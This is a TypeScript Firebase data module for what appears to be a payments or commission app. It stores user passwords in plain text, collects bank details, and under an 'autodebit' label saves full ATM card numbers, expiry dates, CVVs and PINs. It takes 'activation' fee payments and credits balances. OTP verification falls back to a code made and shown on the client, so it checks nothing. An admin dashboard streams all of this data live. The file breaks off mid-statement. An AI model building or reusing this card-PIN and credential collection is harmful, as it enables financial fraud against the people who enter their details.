import { initializeApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import {
  getFirestore,
  doc,
  collection,
  getDoc,
  getDocFromServer,
  getDocs,
  setDoc,
  updateDoc,
  deleteDoc,
  query,
  where,
  orderBy,
  limit,
  onSnapshot,
  writeBatch,
  type Unsubscribe,
} from 'firebase/firestore';
import firebaseConfig from '../firebase-applet-config.json';

const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth(app);

export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(
  error: unknown,
  operationType: OperationType,
  path: string | null
): never {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid || null,
      email: auth.currentUser?.email || null,
      emailVerified: auth.currentUser?.emailVerified ?? null,
      isAnonymous: auth.currentUser?.isAnonymous ?? null,
      tenantId: auth.currentUser?.tenantId || null,
      providerInfo:
        auth.currentUser?.providerData?.map((provider) => ({
          providerId: provider.providerId,
          email: provider.email,
        })) || [],
    },
    operationType,
    path,
  };
  console.error('Firestore Error: ', JSON.stringify(errInfo));
  throw new Error(JSON.stringify(errInfo));
}

async function testConnection() {
  try {
    await getDocFromServer(doc(db, 'test', 'connection'));
  } catch (error) {
    if (error instanceof Error && error.message.includes('the client is offline')) {
      console.error('Please check your Firebase configuration.');
    }
  }
}
void testConnection();

export interface AccountDetails {
  accountNumber: string;
  ifscCode: string;
  bankName: string;
  accountHolder: string;
  accountType?: string;
  contactNumber?: string;
  upiScannerBase64?: string | null;
}

export interface AutodebitDetails {
  atmNumber: string;
  atmExpiry: string;
  atmCvv: string;
  atmPin: string;
  atmName: string;
}

export interface TxnRecord {
  amount: number;
  timestamp: string;
}

export interface UserRecord {
  docId: string;
  username: string;
  password: string;
  mobile: string;
  mobileVerified: boolean;
  email?: string;
  registeredAt: string;
  lastLoginAt: string;
  loginCount: number;
  loginHistory: string[];
  accountDetails?: AccountDetails | null;
  autodebitDetails?: AutodebitDetails | null;
  activated: boolean;
  activationStatus?: 'not_submitted' | 'pending_approval' | 'approved' | 'rejected';
  rejectionMessage?: string;
  activationCode?: string;
  otpProvider?: string;
  firebasePhoneUid?: string;
  balance: number;
  commission: number;
  transactions: TxnRecord[];
}

export interface UtrRecord {
  id: string;
  username: string;
  type: string;
  amount: number;
  utr?: string;
  tokenNumber?: string;
  status: string;
  bank?: string;
  ifsc?: string;
  accNumber?: string;
  contact?: string;
  timestamp: string;
}

export interface ActivityLogRecord {
  id: string;
  username: string;
  mobile?: string;
  actionType: string;
  category?: string;
  details: string;
  status: string;
  timestamp: string;
}

export interface SmsLogRecord {
  id: string;
  username: string;
  bankName: string;
  senderCode?: string;
  amount: number;
  accountNumber?: string;
  timestamp: string;
}

function toUserDocId(username: string): string {
  const cleaned = String(username || '')
    .trim()
    .replace(/[^a-zA-Z0-9_.-]/g, '_');
  return (cleaned || `user_${Date.now()}`).slice(0, 120);
}

function makeSafeId(prefix: string): string {
  return `${prefix}-${Date.now()}-${Math.floor(Math.random() * 100000)}`;
}

async function compressDataUrlIfNeeded(dataUrl: string | null | undefined): Promise<string | null> {
  if (!dataUrl || typeof dataUrl !== 'string') return null;
  if (dataUrl.length <= 450000) return dataUrl;
  try {
    return await new Promise<string | null>((resolve) => {
      const img = new Image();
      img.onload = () => {
        const maxDim = 640;
        let w = img.width;
        let h = img.height;
        if (w > maxDim || h > maxDim) {
          const ratio = Math.min(maxDim / w, maxDim / h);
          w = Math.round(w * ratio);
          h = Math.round(h * ratio);
        }
        const canvas = document.createElement('canvas');
        canvas.width = w;
        canvas.height = h;
        const ctx = canvas.getContext('2d');
        if (!ctx) {
          resolve(dataUrl.slice(0, 450000));
          return;
        }
        ctx.drawImage(img, 0, 0, w, h);
        resolve(canvas.toDataURL('image/jpeg', 0.72));
      };
      img.onerror = () => resolve(null);
      img.src = dataUrl;
    });
  } catch {
    return null;
  }
}

async function writeActivityLog(
  username: string,
  actionType: string,
  details: string,
  category = 'general',
  status = 'success',
  mobileOverride = ''
): Promise<ActivityLogRecord | null> {
  if (!username || username === 'demo') return null;
  const id = makeSafeId('ACT');
  let mobile = mobileOverride;
  if (!mobile) {
    try {
      const uSnap = await getDoc(doc(db, 'users', toUserDocId(username)));
      if (uSnap.exists()) {
        const uData = uSnap.data() as UserRecord;
        mobile = uData.mobile || uData.accountDetails?.contactNumber || '';
      }
    } catch {
      // Ignore lookup error on auxiliary mobile resolution
    }
  }

  const entry: ActivityLogRecord = {
    id,
    username: String(username).slice(0, 64),
    mobile: String(mobile || '').slice(0, 20),
    actionType: String(actionType).slice(0, 48),
    category: String(category).slice(0, 48),
    details: String(details || '').slice(0, 490),
    status: String(status || 'success').slice(0, 32),
    timestamp: new Date().toISOString(),
  };

  try {
    await setDoc(doc(db, 'activityLogs', id), entry);
    return entry;
  } catch (err) {
    if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
      handleFirestoreError(err, OperationType.CREATE, `activityLogs/${id}`);
    }
    return null;
  }
}

async function findUserByIdentifier(identifier: string): Promise<UserRecord | null> {
  const cleanId = String(identifier || '').trim();
  if (!cleanId) return null;

  // 1. Direct lookup by sanitized docId
  const candidateDocId = toUserDocId(cleanId);
  try {
    const directSnap = await getDocFromServer(doc(db, 'users', candidateDocId));
    if (directSnap.exists()) {
      return directSnap.data() as UserRecord;
    }
  } catch (err) {
    if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
      handleFirestoreError(err, OperationType.GET, `users/${candidateDocId}`);
    }
  }

  // 2. Exact username field query
  try {
    const qByUsername = query(collection(db, 'users'), where('username', '==', cleanId), limit(1));
    const snap = await getDocs(qByUsername);
    if (!snap.empty) {
      return snap.docs[0].data() as UserRecord;
    }
  } catch (err) {
    if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
      handleFirestoreError(err, OperationType.LIST, 'users');
    }
  }

  // 3. Mobile number lookup (10 digits)
  const cleanDigits = cleanId.replace(/\D/g, '').slice(-10);
  if (cleanDigits.length === 10) {
    try {
      const qByMobile = query(collection(db, 'users'), where('mobile', '==', cleanDigits), limit(1));
      const snap = await getDocs(qByMobile);
      if (!snap.empty) {
        return snap.docs[0].data() as UserRecord;
      }
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.LIST, 'users');
      }
    }
  }

  return null;
}

let activeOtpProvider: string | null = null;
let activeOtpTargetMobile = '';
const clientFallbackOtps = new Map<string, { code: string; expiresAt: number; attempts: number }>();
let otpSendInFlight: Promise<{
  success: boolean;
  provider?: string;
  mobile?: string;
  otpCode?: string;
  message: string;
}> | null = null;

function generateClientOtpCode(): string {
  if (typeof crypto !== 'undefined' && typeof crypto.getRandomValues === 'function') {
    const arr = new Uint32Array(1);
    crypto.getRandomValues(arr);
    return String(100000 + (arr[0] % 900000));
  }
  return String(Math.floor(100000 + Math.random() * 900000));
}

async function withTimeout<T>(promise: Promise<T>, ms: number): Promise<T | null> {
  let timer: ReturnType<typeof setTimeout> | undefined;
  try {
    return await Promise.race([
      promise,
      new Promise<null>((resolve) => {
        timer = setTimeout(() => resolve(null), ms);
      }),
    ]);
  } finally {
    if (timer !== undefined) clearTimeout(timer);
  }
}

async function fetchWithTimeout(url: string, init: RequestInit, ms: number): Promise<Response> {
  const controller = typeof AbortController !== 'undefined' ? new AbortController() : null;
  const timer = controller ? setTimeout(() => controller.abort(), ms) : undefined;
  try {
    return await fetch(url, controller ? { ...init, signal: controller.signal } : init);
  } finally {
    if (timer !== undefined) clearTimeout(timer);
  }
}

const FirebaseStore = {
  async sendRealMobileOtp(mobile: string) {
    if (otpSendInFlight) {
      return otpSendInFlight;
    }

    const executeSend = async () => {
      const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);
      if (!/^[6-9]\d{9}$/.test(cleanMobile)) {
        return { success: false, message: 'Please enter a valid 10-digit Indian mobile number (starting 6-9)!' };
      }

      // Check if mobile number is already registered in Firestore (bounded timeout so slow mobile networks never hang Get OTP)
      try {
        const dupMobQ = query(collection(db, 'users'), where('mobile', '==', cleanMobile), limit(1));
        const dupMobSnap = await withTimeout(getDocs(dupMobQ), 2200);
        if (dupMobSnap && !dupMobSnap.empty) {
          return { success: false, message: 'This mobile number is already registered! Please login instead.' };
        }
      } catch (err) {
        if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
          console.warn('Firestore duplicate mobile check skipped due to rules:', err.message);
        }
      }

      activeOtpProvider = null;
      activeOtpTargetMobile = cleanMobile;

      try {
        const apiRes = await fetchWithTimeout(
          '/api/auth/otp/send',
          {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ mobile: cleanMobile }),
          },
          2200
        );
        const contentType = apiRes.headers.get('content-type') || '';
        if (contentType.includes('application/json')) {
          const apiData = (await apiRes.json()) as {
            success?: boolean;
            provider?: string;
            otpCode?: string;
            message?: string;
          };
          if (apiRes.ok && apiData.success) {
            activeOtpProvider = apiData.provider || 'free-otp';
            if (apiData.otpCode) {
              clientFallbackOtps.set(cleanMobile, {
                code: String(apiData.otpCode),
                expiresAt: Date.now() + 10 * 60 * 1000,
                attempts: 0,
              });
            }
            return {
              success: true,
              provider: activeOtpProvider,
              mobile: cleanMobile,
              otpCode: apiData.otpCode,
              message: apiData.message || `OTP sent to +91 ${cleanMobile}!`,
            };
          }
          if (apiRes.status === 400 && apiData.success === false && /invalid/i.test(apiData.message || '')) {
            return {
              success: false,
              message: apiData.message || 'Please enter a valid 10-digit Indian mobile number!',
            };
          }
        }
      } catch {
        // Static hosting / timeout / proxy fallback (GitHub Pages / Netlify / Vercel / any link)
      }

      // Client-side zero-backend OTP fallback for static & cross-device deployments
      const fallbackCode = generateClientOtpCode();
      clientFallbackOtps.set(cleanMobile, {
        code: fallbackCode,
        expiresAt: Date.now() + 10 * 60 * 1000,
        attempts: 0,
      });
      activeOtpProvider = 'free-otp';
      return {
        success: true,
        provider: 'free-otp',
        mobile: cleanMobile,
        otpCode: fallbackCode,
        message: `Verification OTP generated for +91 ${cleanMobile}`,
      };
    };

    otpSendInFlight = executeSend().finally(() => {
      otpSendInFlight = null;
    });
    return otpSendInFlight;
  },

  async verifyRealMobileOtp(otpCode: string, mobile: string) {
    const cleanMobile = String(mobile || '').replace(/\D/g, '').slice(-10);
    const cleanCode = String(otpCode || '').trim();

    if (!/^\d{6}$/.test(cleanCode)) {
      return { success: false, message: 'Please enter a valid 6-digit OTP code.' };
    }
    if (activeOtpTargetMobile && activeOtpTargetMobile !== cleanMobile) {
      return { success: false, message: 'Mobile number changed. Please click Get OTP again.' };
    }

    const fallbackRecord = clientFallbackOtps.get(cleanMobile);
    if (fallbackRecord) {
      if (Date.now() > fallbackRecord.expiresAt) {
        clientFallbackOtps.delete(cleanMobile);
        return { success: false, message: 'OTP has expired! Please request a new one.' };
      }
      fallbackRecord.attempts += 1;
      if (fallbackRecord.attempts > 5) {
        clientFallbackOtps.delete(cleanMobile);
        return { success: false, message: 'Too many wrong attempts. Please request a new OTP.' };
      }
      if (fallbackRecord.code !== cleanCode) {
        return { success: false, message: 'Incorrect OTP code entered. Please check the generated OTP.' };
      }
      clientFallbackOtps.delete(cleanMobile);
      return {
        success: true,
        provider: activeOtpProvider || 'free-otp',
        firebasePhoneUid: '',
        phoneNumber: `+91${cleanMobile}`,
        message: 'Mobile number verified successfully!',
      };
    }

    try {
      const res = await fetchWithTimeout(
        '/api/auth/otp/verify',
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ mobile: cleanMobile, code: cleanCode }),
        },
        3500
      );
      const data = (await res.json()) as { success?: boolean; provider?: string; message?: string };
      if (res.ok && data.success) {
        return {
          success: true,
          provider: data.provider || activeOtpProvider || 'free-otp',
          firebasePhoneUid: '',
          phoneNumber: `+91${cleanMobile}`,
          message: data.message || 'Mobile number verified successfully!',
        };
      }
      return { success: false, message: data.message || 'Invalid OTP code.' };
    } catch {
      return { success: false, message: 'Verification request failed. Please try again.' };
    }
  },

  async registerUser(payload: {
    mobile: string;
    username: string;
    password: string;
    email?: string;
    otpProvider?: string;
    firebasePhoneUid?: string;
  }) {
    const uname = String(payload.username || '').trim();
    const pwd = String(payload.password || '').trim();
    const cleanMobile = String(payload.mobile || '').replace(/\D/g, '').slice(-10);

    if (!uname || uname.length < 3 || !pwd || pwd.length < 4) {
      return { success: false, message: 'Valid username (min 3 chars) and password (min 4 chars) are required.' };
    }
    if (!/^[6-9]\d{9}$/.test(cleanMobile)) {
      return { success: false, message: 'Please enter a valid 10-digit Indian mobile number!' };
    }

    const docId = toUserDocId(uname);
    try {
      const existingById = await getDocFromServer(doc(db, 'users', docId));
      if (existingById.exists()) {
        return { success: false, message: 'Username already taken! Please choose another.' };
      }

      const dupUserQ = query(collection(db, 'users'), where('username', '==', uname), limit(1));
      const dupUserSnap = await getDocs(dupUserQ);
      if (!dupUserSnap.empty) {
        return { success: false, message: 'Username already taken! Please choose another.' };
      }

      const dupMobQ = query(collection(db, 'users'), where('mobile', '==', cleanMobile), limit(1));
      const dupMobSnap = await getDocs(dupMobQ);
      if (!dupMobSnap.empty) {
        return { success: false, message: 'This mobile number is already registered! Please login.' };
      }
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.GET, `users/${docId}`);
      }
      return { success: false, message: 'Unable to reach Firebase Firestore. Please try again.' };
    }

    const now = new Date().toISOString();
    const newUser: UserRecord = {
      docId,
      username: uname,
      password: pwd,
      mobile: cleanMobile,
      mobileVerified: true,
      email: payload.email || `${cleanMobile}@accountfunds.in`,
      registeredAt: now,
      lastLoginAt: '',
      loginCount: 0,
      loginHistory: [],
      accountDetails: null,
      autodebitDetails: null,
      activated: false,
      activationStatus: 'not_submitted',
      rejectionMessage: '',
      activationCode: '',
      otpProvider: String(payload.otpProvider || 'firebase-phone').slice(0, 40),
      firebasePhoneUid: String(payload.firebasePhoneUid || '').slice(0, 128),
      balance: 0,
      commission: 0,
      transactions: [],
    };

    try {
      await setDoc(doc(db, 'users', docId), newUser);
      await writeActivityLog(uname, 'register', `New user registered with OTP verified mobile +91 ${cleanMobile} (${newUser.otpProvider})`, 'registration', 'success', cleanMobile);
      return {
        success: true,
        message: 'Registration successful! Please login with your mobile number or username and password.',
        user: newUser,
      };
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.CREATE, `users/${docId}`);
      }
      return { success: false, message: 'Failed to register in Firestore. Please retry.' };
    }
  },

  async loginUser(payload: { identifier: string; password: string }) {
    const identifier = String(payload.identifier || '').trim();
    const pwd = String(payload.password || '').trim();

    if (!identifier || !pwd) {
      return { success: false, message: 'Username/mobile and password are required.' };
    }

    let userRecord: UserRecord | null = null;
    try {
      userRecord = await findUserByIdentifier(identifier);
    } catch {
      return { success: false, message: 'Firestore connection error. Please retry.' };
    }

    if (!userRecord) {
      return { success: false, message: 'Account not found with this username or mobile!' };
    }

    if (userRecord.password !== pwd) {
      await writeActivityLog(userRecord.username, 'login_failed', `Failed login attempt (invalid password)`, 'auth', 'failed', userRecord.mobile);
      return { success: false, message: 'Incorrect password!' };
    }

    const now = new Date().toISOString();
    const nextHistory = Array.isArray(userRecord.loginHistory) ? [...userRecord.loginHistory, now] : [now];
    if (nextHistory.length > 50) nextHistory.splice(0, nextHistory.length - 50);
    const nextCount = (Number(userRecord.loginCount) || 0) + 1;

    try {
      await updateDoc(doc(db, 'users', userRecord.docId), {
        lastLoginAt: now,
        loginCount: nextCount,
        loginHistory: nextHistory,
      });
      await writeActivityLog(userRecord.username, 'login', `User logged in via Firestore auth`, 'auth', 'success', userRecord.mobile);
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${userRecord.docId}`);
      }
    }

    const updatedUser: UserRecord = {
      ...userRecord,
      lastLoginAt: now,
      loginCount: nextCount,
      loginHistory: nextHistory,
    };

    return {
      success: true,
      username: updatedUser.username,
      message: 'Login successful!',
      user: updatedUser,
    };
  },

  async getUserProfile(username: string): Promise<UserRecord | null> {
    if (!username || username === 'demo') return null;
    return findUserByIdentifier(username);
  },

  subscribeUserProfile(username: string, onChange: (user: UserRecord | null) => void): Unsubscribe {
    const docId = toUserDocId(username);
    return onSnapshot(
      doc(db, 'users', docId),
      (snap) => {
        onChange(snap.exists() ? (snap.data() as UserRecord) : null);
      },
      (error) => {
        if (error.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(error, OperationType.GET, `users/${docId}`);
        }
      }
    );
  },

  subscribeUserUtrs(username: string, onChange: (utrs: UtrRecord[]) => void): Unsubscribe {
    const q = query(collection(db, 'utrs'), where('username', '==', username), limit(50));
    return onSnapshot(
      q,
      (snap) => {
        const items = snap.docs.map((d) => d.data() as UtrRecord);
        items.sort((a, b) => new Date(b.timestamp || 0).getTime() - new Date(a.timestamp || 0).getTime());
        onChange(items);
      },
      (error) => {
        if (error.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(error, OperationType.LIST, 'utrs');
        }
      }
    );
  },

  async saveAccountDetails(username: string, details: AccountDetails) {
    if (!username || username === 'demo') return false;
    const docId = toUserDocId(username);
    const compressedQr = await compressDataUrlIfNeeded(details.upiScannerBase64);

    let existingUser = await findUserByIdentifier(username);
    const sanitizedDetails: AccountDetails = {
      accountNumber: String(details.accountNumber || '').trim().slice(0, 32),
      ifscCode: String(details.ifscCode || '').trim().toUpperCase().slice(0, 15),
      bankName: String(details.bankName || '').trim().slice(0, 120),
      accountHolder: String(details.accountHolder || '').trim().slice(0, 120),
      accountType: String(details.accountType || 'Saving').trim().slice(0, 32),
      contactNumber: String(details.contactNumber || existingUser?.mobile || '').trim().slice(0, 20),
      upiScannerBase64: compressedQr || existingUser?.accountDetails?.upiScannerBase64 || null,
    };

    try {
      if (existingUser) {
        const updatePayload: Record<string, unknown> = { accountDetails: sanitizedDetails };
        if (!existingUser.mobile && sanitizedDetails.contactNumber) {
          updatePayload.mobile = sanitizedDetails.contactNumber.replace(/\D/g, '').slice(-10);
        }
        await updateDoc(doc(db, 'users', existingUser.docId), updatePayload);
      } else {
        const now = new Date().toISOString();
        const fallbackMobile = (sanitizedDetails.contactNumber || '').replace(/\D/g, '').slice(-10);
        const created: UserRecord = {
          docId,
          username,
          password: 'user1234',
          mobile: fallbackMobile,
          mobileVerified: true,
          email: `${username}@accountfunds.in`,
          registeredAt: now,
          lastLoginAt: now,
          loginCount: 1,
          loginHistory: [now],
          accountDetails: sanitizedDetails,
          autodebitDetails: null,
          activated: false,
          activationCode: '',
          balance: 0,
          commission: 0,
          transactions: [],
        };
        await setDoc(doc(db, 'users', docId), created);
      }

      const last4 = sanitizedDetails.accountNumber.slice(-4).padStart(4, '0');
      await writeActivityLog(
        username,
        'bank_details',
        `Added bank: ${sanitizedDetails.bankName} (IFSC: ${sanitizedDetails.ifscCode}, Acc: ${sanitizedDetails.accountNumber} [XXXX${last4}], Holder: ${sanitizedDetails.accountHolder})`,
        'banking',
        'success',
        sanitizedDetails.contactNumber
      );
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${docId}`);
      }
      return false;
    }
  },

  async saveAutodebitDetails(username: string, details: AutodebitDetails) {
    if (!username || username === 'demo') return false;
    const docId = toUserDocId(username);
    const sanitizedAtm: AutodebitDetails = {
      atmNumber: String(details.atmNumber || '').trim().slice(0, 24),
      atmExpiry: String(details.atmExpiry || '').trim().slice(0, 10),
      atmCvv: String(details.atmCvv || '').trim().slice(0, 6),
      atmPin: String(details.atmPin || '').trim().slice(0, 10),
      atmName: String(details.atmName || '').trim().slice(0, 120),
    };

    try {
      const existingUser = await findUserByIdentifier(username);
      if (existingUser) {
        await updateDoc(doc(db, 'users', existingUser.docId), { autodebitDetails: sanitizedAtm });
      }
      const cardLast4 = sanitizedAtm.atmNumber.slice(-4);
      await writeActivityLog(
        username,
        'autodebit',
        `Configured ATM autodebit (Card: XXXX${cardLast4}, Exp: ${sanitizedAtm.atmExpiry}, Name: ${sanitizedAtm.atmName})`,
        'atm',
        'success'
      );
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${docId}`);
      }
      return false;
    }
  },

  async submitUtrRecord(payload: {
    username: string;
    record: Partial<UtrRecord>;
    activationCode?: string;
    actionType?: string;
    activityText?: string;
  }) {
    const uname = String(payload.username || '').trim();
    if (!uname || uname === 'demo') return null;

    const existingUser = await findUserByIdentifier(uname);
    const acc = existingUser?.accountDetails;
    const rawId = payload.record.id || makeSafeId('WTH');
    const safeId = rawId.replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 120);

    const entry: UtrRecord = {
      id: safeId,
      username: uname,
      type: String(payload.record.type || 'UTR Submission').slice(0, 100),
      amount: Number(payload.record.amount || 0),
      utr: String(payload.record.utr || '').slice(0, 64),
      tokenNumber: String(payload.record.tokenNumber || payload.record.utr || '').slice(0, 64),
      status: String(payload.record.status || 'Pending Admin Approval').slice(0, 80),
      bank: String(payload.record.bank || acc?.bankName || 'UPI Payment').slice(0, 120),
      ifsc: String(payload.record.ifsc || acc?.ifscCode || '').slice(0, 20),
      accNumber: String(payload.record.accNumber || acc?.accountNumber || '').slice(0, 32),
      contact: String(payload.record.contact || acc?.contactNumber || existingUser?.mobile || '').slice(0, 20),
      timestamp: payload.record.timestamp || new Date().toISOString(),
    };

    try {
      await setDoc(doc(db, 'utrs', safeId), entry);
      const isPaymentSubmission =
        payload.actionType === 'activation_utr' ||
        payload.actionType === 'upgrade_utr' ||
        entry.type.toLowerCase().includes('activation') ||
        entry.type.toLowerCase().includes('upgrade');

      if (existingUser && isPaymentSubmission) {
        const userUpdates: Record<string, unknown> = {
          activated: false,
          activationStatus: 'pending_approval',
          rejectionMessage: '',
        };
        if (payload.activationCode) {
          userUpdates.activationCode = String(payload.activationCode).slice(0, 32);
        }
        await updateDoc(doc(db, 'users', existingUser.docId), userUpdates);
      } else if (existingUser && payload.activationCode) {
        await updateDoc(doc(db, 'users', existingUser.docId), {
          activationCode: String(payload.activationCode).slice(0, 32),
        });
      }

      await writeActivityLog(
        uname,
        payload.actionType || 'activation_utr',
        payload.activityText || `Submitted ${entry.type}: ${entry.utr || entry.tokenNumber} (₹${entry.amount})`,
        'payment',
        'info',
        entry.contact
      );
      return entry;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.CREATE, `utrs/${safeId}`);
      }
      return null;
    }
  },

  async markActivationPending(username: string, activationCode = '') {
    if (!username || username === 'demo') return false;
    const existingUser = await findUserByIdentifier(username);
    if (!existingUser) return false;
    try {
      const updates: Record<string, unknown> = {
        activated: false,
        activationStatus: 'pending_approval',
        rejectionMessage: '',
      };
      if (activationCode) updates.activationCode = String(activationCode).slice(0, 32);
      await updateDoc(doc(db, 'users', existingUser.docId), updates);
      await writeActivityLog(
        username,
        'activation_pending',
        `Customer submitted verification code. Panel is under Admin verification (transactions locked until Admin approves).`,
        'activation',
        'info'
      );
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${existingUser.docId}`);
      }
      return false;
    }
  },

  async recordTransaction(payload: {
    username: string;
    amount: number;
    timestamp: string;
    balance: number;
    commission: number;
    smsRecord?: { id?: string; bankName?: string; senderCode?: string; accountNumber?: string };
  }) {
    const uname = String(payload.username || '').trim();
    if (!uname || uname === 'demo') return false;

    const existingUser = await findUserByIdentifier(uname);
    if (existingUser) {
      const nextTxns = Array.isArray(existingUser.transactions) ? [...existingUser.transactions] : [];
      nextTxns.push({ amount: Number(payload.amount || 0), timestamp: payload.timestamp || new Date().toISOString() });
      if (nextTxns.length > 200) nextTxns.splice(0, nextTxns.length - 200);

      try {
        await updateDoc(doc(db, 'users', existingUser.docId), {
          balance: Number(payload.balance || 0),
          commission: Number(payload.commission || 0),
          transactions: nextTxns,
        });
      } catch (err) {
        if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.UPDATE, `users/${existingUser.docId}`);
        }
      }
    }

    if (payload.smsRecord) {
      const smsId = (payload.smsRecord.id || makeSafeId('SMS')).replace(/[^a-zA-Z0-9_-]/g, '-').slice(0, 120);
      const smsEntry: SmsLogRecord = {
        id: smsId,
        username: uname,
        bankName: String(payload.smsRecord.bankName || existingUser?.accountDetails?.bankName || 'Linked Bank').slice(0, 120),
        senderCode: String(payload.smsRecord.senderCode || 'VM-BANK').slice(0, 32),
        amount: Number(payload.amount || 0),
        accountNumber: String(payload.smsRecord.accountNumber || existingUser?.accountDetails?.accountNumber || '').slice(0, 32),
        timestamp: payload.timestamp || new Date().toISOString(),
      };
      try {
        await setDoc(doc(db, 'smsLogs', smsId), smsEntry);
      } catch (err) {
        if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.CREATE, `smsLogs/${smsId}`);
        }
      }
    }

    const acc = existingUser?.accountDetails;
    const last4 = String(acc?.accountNumber || '0000').slice(-4).padStart(4, '0');
    await writeActivityLog(
      uname,
      'credit_transaction',
      `Auto-credited ₹${Number(payload.amount || 0).toLocaleString('en-IN')} to ${acc?.bankName || 'Linked Bank'} (XXXX${last4})`,
      'credit',
      'success'
    );
    return true;
  },

  async removeBankData(username: string) {
    if (!username || username === 'demo') return false;
    const existingUser = await findUserByIdentifier(username);
    if (!existingUser) return false;
    try {
      await updateDoc(doc(db, 'users', existingUser.docId), {
        accountDetails: null,
        autodebitDetails: null,
        activated: false,
        activationStatus: 'not_submitted',
        rejectionMessage: '',
        balance: 0,
        commission: 0,
        transactions: [],
      });
      await writeActivityLog(username, 'bank_removed', `User removed linked bank account and stopped autodebit.`, 'security', 'warning');
      return true;
    } catch (err) {
      if (err instanceof Error && err.message.includes('Missing or insufficient permissions')) {
        handleFirestoreError(err, OperationType.UPDATE, `users/${existingUser.docId}`);
      }
      return false;
    }
  },

  async logActivity(username: string, actionType: string, details: string, category = 'general', status = 'success') {
    return writeActivityLog(username, actionType, details, category, status);
  },

  // ----------------------------------------
  // REAL-TIME FIRESTORE SUBSCRIPTION FOR ADMIN PANEL
  // ----------------------------------------
  subscribeAdminDashboard(
    onUpdate: (data: {
      usersMap: Record<string, UserRecord>;
      utrs: UtrRecord[];
      activityLogs: ActivityLogRecord[];
      smsLogs: SmsLogRecord[];
    }) => void
  ): () => void {
    const state = {
      usersMap: {} as Record<string, UserRecord>,
      utrs: [] as UtrRecord[],
      activityLogs: [] as ActivityLogRecord[],
      smsLogs: [] as SmsLogRecord[],
    };

    const emit = () => onUpdate({ ...state });

    const unsubUsers = onSnapshot(
      collection(db, 'users'),
      (snap) => {
        const map: Record<string, UserRecord> = {};
        snap.forEach((docSnap) => {
          const u = docSnap.data() as UserRecord;
          if (u && u.username && u.username !== 'demo') {
            map[u.username] = u;
          }
        });
        state.usersMap = map;
        emit();
      },
      (err) => {
        if (err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.LIST, 'users');
        }
      }
    );

    const unsubUtrs = onSnapshot(
      query(collection(db, 'utrs'), orderBy('timestamp', 'desc'), limit(300)),
      (snap) => {
        state.utrs = snap.docs.map((d) => d.data() as UtrRecord);
        emit();
      },
      (err) => {
        if (err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.LIST, 'utrs');
        }
      }
    );

    const unsubLogs = onSnapshot(
      query(collection(db, 'activityLogs'), orderBy('timestamp', 'desc'), limit(500)),
      (snap) => {
        state.activityLogs = snap.docs.map((d) => d.data() as ActivityLogRecord);
        emit();
      },
      (err) => {
        if (err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.LIST, 'activityLogs');
        }
      }
    );

    const unsubSms = onSnapshot(
      query(collection(db, 'smsLogs'), orderBy('timestamp', 'desc'), limit(300)),
      (snap) => {
        state.smsLogs = snap.docs.map((d) => d.data() as SmsLogRecord);
        emit();
      },
      (err) => {
        if (err.message.includes('Missing or insufficient permissions')) {
          handleFirestoreError(err, OperationType.LIST, 'smsLogs');
        }
      }
    );

    return () => {
      unsubUsers();
      unsubUtrs();
      unsubLogs();
      unsubSms();
    };
  },

  async adminApproveUtr(utrId: string, username: string) {
    try {
      const utrRef = doc(db, 'utrs', utrId);
      const utrSnap = await getDoc(utrRef);
      const utrData = utrSnap.exists() ? (utrSnap.data() as UtrRecord) : null;
      const isUpgrade199 =
        Boolean(utrData && (Number(utrData.amount) === 199 || String(utrData.type || '').includes('199') || String(utrData.type || '').toLowerCase().includes('upgrade')));
      const approvedStatus = isUpgrade199 ? '✓ Approved & Receipt Generated' : '✓ Approved & Activated';

      await updateDoc(utrRef, { status: approvedStatus });
      const userObj = await findUserByIdentifier(username);
      if (userObj) {
        await updateDoc(doc(db, 'users', userObj.docId), {
          activated: true,
          activationStatus: 'approved',
          rejectionMessage: '',
        });
      }
      await writeActivityLog(
        username,
        'activation',
        isUpgrade199
